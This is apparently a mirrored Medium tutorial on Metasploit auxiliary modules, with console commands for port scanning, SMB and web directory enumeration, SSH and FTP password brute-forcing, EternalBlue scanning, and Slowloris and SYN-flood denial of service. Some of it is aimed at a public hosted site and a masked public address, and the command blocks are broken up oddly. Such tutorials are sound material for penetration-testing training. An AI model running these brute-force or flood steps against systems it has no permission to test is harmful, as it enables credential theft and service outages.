---
title: "Metasploit modules guide. Auxiliary"
description: "Complete Explanation of Auxiliary Mode in Metasploit"
image: "https://cdn-images-1.medium.com/max/800/0*K7UGyUTHvpwefq4a.png"
---

# Metasploit modules guide. Auxiliary


![Cover image](https://cdn-images-1.medium.com/max/800/0*K7UGyUTHvpwefq4a.png)

:::info Article Metadata
- **Category:** CTI
- **Source article:** [https://medium.com/@1200km/metasploit-modules-guide-auxiliary-1821db1712f0](https://medium.com/@1200km/metasploit-modules-guide-auxiliary-1821db1712f0)
- **Published:** 2024-11-18
- **Preserved media:** 24 image(s), including cover images, screenshots, diagrams, and infographics where present.
- **Preserved technical blocks:** 30 code/configuration block(s).
:::

## Ecosystem Fit

This page mirrors the original Medium article into the 1200km.com Docusaurus ecosystem. The original article flow, images, screenshots, infographics, and technical blocks are preserved from the export.

### Complete Explanation of Auxiliary Mode in Metasploit

![Article image](https://cdn-images-1.medium.com/max/800/0*K7UGyUTHvpwefq4a.png)

[Comprehensive Guide to Metasploit. Part 1](2024-11-17-the-ultimate-guide-to-metasploit-part-1-43c8573487df.md)

The Ultimate Guide to Metasploit. Part 2

## Introduction

The**auxiliary mode**in Metasploit is a non-exploit-focused category of modules designed for tasks such as reconnaissance, scanning, enumeration, password brute-forcing, and testing. These modules help gather information, identify vulnerabilities, and assess systems without actively exploiting them. They are essential in the early stages of penetration testing and for non-destructive assessments.

**If you want to see all auxiliary modules, open Metasploit and run next command:**

```text
show
 auxiliary
```

![Article image](https://cdn-images-1.medium.com/max/800/1*841wr-7t7wIMaSUJyalJ9Q.png)

## Standart commands:

Search module:

```text
search 
<
name
>
```

Use module from list by ID

```text
use
 
0
```

Use module by name

```text
use <
module
 name>
```

Show configuration options:

```text
show
 options
```

Set parameters:

```text
set
 
<
name 
of
 
parameter
>
 
<
parameter
>
```

Run module

```text
run
```

## Now real life examples of usage

- **Scanners**

- **Enumerators**

- **Brute-Forcers**

- **Vulnerability Scanners**

- **Network Discovery**

- **Denial of Service (DoS)**

### 1. Scanners

- **Purpose**: Identify open ports, active services, and vulnerabilities in networks or systems.

### Examples :

`auxiliary/scanner/portscan/tcp`: Scans for open TCP ports.

```text
search auxiliary/scanner/portscan/tcp
```

![Article image](https://cdn-images-1.medium.com/max/800/1*kGwGQb_vlY2UEu1PWf_6qg.png)

```text
use
 
0
show options
```

![Article image](https://cdn-images-1.medium.com/max/800/1*cbo_IgrkTakTk7R7lMAJFQ.png)

```text
set
 RHOST 192.168.126.130
run
```

![Article image](https://cdn-images-1.medium.com/max/800/1*QE1iHIDZ6-WEkduJPE8qUQ.png)

`auxiliary/scanner/http/http_version`: Detects the HTTP server version:

```text
search auxiliary/scanner/http/http_version
```

![Article image](https://cdn-images-1.medium.com/max/800/1*s58UjVjcPk73DQiBChir7A.png)

```text
use
 
0
show options
```

![Article image](https://cdn-images-1.medium.com/max/800/1*VjqjJ1K2a90x0SogjSgyMw.png)

```text
set
 RHOSTS https://juice-shop.herokuapp.com/
set
 RPORT 443
set
 SSL 
true
run
```

![Article image](https://cdn-images-1.medium.com/max/800/1*qK5y4mVzer5lXpXeLZeEhA.png)

### 2. Enumerators

- **Purpose**: Gather detailed information about services, configurations, and resources on a system.

### Examples :

- `auxiliary/scanner/smb/smb_enumshares`: Lists shared folders in SMB.

```text
search auxiliary/scanner/smb/smb_enumshares
```

![Article image](https://cdn-images-1.medium.com/max/800/1*QXfrBz_Xy2FWYXIx715PXA.png)

```text
use
 
0
show options
```

![Article image](https://cdn-images-1.medium.com/max/800/1*ia5MA_9Hu9CgZoAZ4ZZRGA.png)

```text
set
 RHOST 182.x.x.x
run
```

![Article image](https://cdn-images-1.medium.com/max/800/1*XFxE1fnh-lBJInaYERyH7g.png)

- `auxiliary/scanner/http/dir_scanner`: Finds hidden web directories.

```text
search
 auxiliary
/
scanner
/
http
/
dir_scanner
use 
0
show
 options
```

![Article image](https://cdn-images-1.medium.com/max/800/1*3n4QNUHvEcnJTXZujtGe9g.png)

```text
set
 RHOST https://juice-shop.herokuapp.com/
set
 RPORT 443
```

You can use custom directions dictionaries.

For example:

```text
set
 DICTIONARY /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
```

![Article image](https://cdn-images-1.medium.com/max/800/1*3GZOOJs-nie63FQWq9CBWg.png)

### 3. Brute-Forcers

[More information about brute force attacks here](2024-10-29-passwords-cracking-zip-pdf-web-rdp-ssh-cameras-c1bacbd592cd.md)

- **Purpose**: Automate password brute-forcing for authentication protocols like SSH, FTP, and HTTP.

- **Examples**:

`auxiliary/scanner/ssh/ssh_login`: Brute-forces SSH credentials.

```text
search auxiliary/scanner/ssh/ssh_login
```

![Article image](https://cdn-images-1.medium.com/max/800/1*DCo92cNE5wA9_Ewo2d6-xQ.png)

```text
use
 
0
show options
```

![Article image](https://cdn-images-1.medium.com/max/800/1*PsJqYaW4d3X97ZsdwJAWQQ.png)

```text
set
 ANONYMOUS_LOGIN 
true
set
 PASS_FILE ~/Documents/PasswordCracking/Dictionaries/short.txt
set
 RHOSTS 192.168.126.130
set
 USER_FILE ~/Documents/PasswordCracking/Dictionaries/1000_usernames.txt
run
```

![Article image](https://cdn-images-1.medium.com/max/800/1*15QkCbyvNdz19ixx1XW8Gw.png)

Succsess

`auxiliary/scanner/ftp/ftp_login`: Brute-forces FTP logins.

```text
search auxiliary/scanner/ftp/ftp_login
```

![Article image](https://cdn-images-1.medium.com/max/800/1*z-9tmT5KYEEvhsAowMurdQ.png)

```text
use
 
0
show options
```

![Article image](https://cdn-images-1.medium.com/max/800/1*Q9EnA2iwru1RZK_gr02iUQ.png)

```text
set
 ANONYMOUS_LOGIN 
true
set
 PASS_FILE ~/Documents/PasswordCracking/Dictionaries/short.txt
set
 RHOSTS 192.168.126.130
set
 USER_FILE ~/Documents/PasswordCracking/Dictionaries/1000_usernames.txt
run
```

![Article image](https://cdn-images-1.medium.com/max/800/1*ImDFrdWjREdzNfgbKZVexA.png)

### 4. Vulnerability Scanners

**Purpose**: Check for known vulnerabilities in services or protocols.

- **Examples**:

`auxiliary/scanner/smb/smb_ms17_010`: Scans for EternalBlue vulnerability.

```text
search
 auxiliary
/
scanner
/
smb
/
smb_ms17_010
use 
0
show
 options
set
 RHOSTS 
192.168
.126
.150
run
```

![Article image](https://cdn-images-1.medium.com/max/800/1*s1K0d7vJq3o3gGnnpkK_-w.png)

### 5. Network Discovery

**Purpose**: Identify hosts, devices, and network configurations.

**Examples**:

`auxiliary/scanner/discovery/arp_sweep`: Identifies active hosts on a subnet.

**Run msfconsole as sudo**

```text
search
 auxiliary
/
scanner
/
discovery
/
arp_sweep
use 
0
show
 options
set
 INTERFACE vmnet8
set
 RHOSTS 
192.168
.126
.13
run
```

![Article image](https://cdn-images-1.medium.com/max/800/1*Xf9WQA7ImmX0wqOziv5uFg.png)

- `auxiliary/scanner/rdp/rdp_scanner`: Scans for RDP-enabled devices.

```text
search
 auxiliary
/
scanner
/
rdp
/
rdp_scanner
use 
0
 
show
 options
set
 RHOSTS 
192.168
.126
.130
run
```

![Article image](https://cdn-images-1.medium.com/max/800/1*EU0U6-fPQz4bLjqUG8w3DQ.png)

### 6. Denial of Service (DoS)

**Purpose**: Test systems for susceptibility to DoS attacks.

**Examples**:

`auxiliary/dos/http/slowloris`: Simulates Slowloris DoS on HTTP servers.

```text
search
 auxiliary
/
dos
/
http
/
slowloris
use 
0
show
 options
set
 rhost juice
-
shop.herokuapp.com
set
 rport 
443
sel ssl 
true
run
```

![Article image](https://cdn-images-1.medium.com/max/800/1*l-aA5bZHnIDPEWtWDp49ZA.png)

`auxiliary/dos/tcp/synflood`: Launches a TCP SYN flood attack.

```text
search auxiliary/dos/tcp/synflood
use 0
set
 INTERFACE wlan0
set
 RHOSTS juice-shop.herokuapp.com
set
 RPORT 443
run
```

![Article image](https://cdn-images-1.medium.com/max/800/1*wxP84HLArziOJKBVvXbY4A.png)

### Search and try other modules!

[**Auxiliary Module Reference - Metasploit Unleashed**
*The Metasploit Framework includes hundreds of auxiliary modules that perform scanning, fuzzing, sniffing, and much…*www.offsec.com](https://www.offsec.com/metasploit-unleashed/auxiliary-module-reference/)[](https://www.offsec.com/metasploit-unleashed/auxiliary-module-reference/)

## Good luck!

1200km@gmail.com
